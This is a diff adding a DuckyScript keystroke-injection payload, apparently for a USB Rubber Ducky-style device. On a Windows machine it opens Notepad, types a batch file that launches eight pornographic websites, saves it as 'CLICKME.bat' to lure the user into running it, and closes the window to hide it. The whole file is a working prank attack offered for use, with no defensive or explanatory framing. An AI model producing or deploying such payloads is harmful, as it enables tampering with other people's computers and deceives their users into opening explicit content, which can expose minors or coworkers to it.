@@ -1,0 +1,89 @@
+REM MADE BY https://github.com/wilsegale
+REM made on sep/25/2023
+REM PUT PORN SITES ON A COMPUTER
+
+REM open the short cut window
+GUI r
+
+REM wait 2 seconds
+DELAY 2000
+
+REM input the notepad file into the 
+STRING notepad.exe
+
+REM wait for 2 seconds
+DELAY 2000
+
+REM input the enter key to open notepad.exe
+ENTER
+
+REM wait for 8 millisonds
+DELAY 800
+
+REM input the @echo off so when the terminal in open it doent show the start <file name>
+STRING @echo off
+
+REM input the enter key to open notepad.exe
+ENTER
+
+REM wait for 2 seconds
+DELAY 2000
+
+REM input the porn site into the attack file
+STRING START HTTPS://PRONHUB.COM/
+
+REM input the enter key to open notepad.exe
+ENTER
+
+REM wait for 2 seconds
+DELAY 2000
+
+REM input the porn site in the attack file
+STRING START https://porntn.com/
+ENTER
+DELAY 2000
+
+REM input the porn site in the attack file
+STRING START https://nhentai.io/
+DELAY 2000
+ENTER
+DELAY 2000
+REM input the porn site in the attack file
+STRING START https://www.pornelephant.org/
+ENTER
+DELAY 2000
+
+REM input the porn site in the attack file
+STRING START https://www.pornerbros.com/
+ENTER
+DELAY 2000
+
+REM input the porn site in the attack file
+STRING START https://www.porneskimo.com/
+ENTER
+DELAY 2000
+
+REM input the porn site in the attack file
+STRING START https://www.pornex.com/
+ENTER
+DELAY 2000
+
+REM input the porn site in the attack file
+STRING START https://www.pornfidelity.com/
+
+DELAY 2000
+
+REM saves the file
+CTRL S
+
+DELAY 750
+
+REM inputs the file name for the user to click when the attack starts
+STRING CLICKME.bat
+
+DELAY 750
+ENTER
+DELAY 750
+
+REM close the file so its hidden
+CTRL W
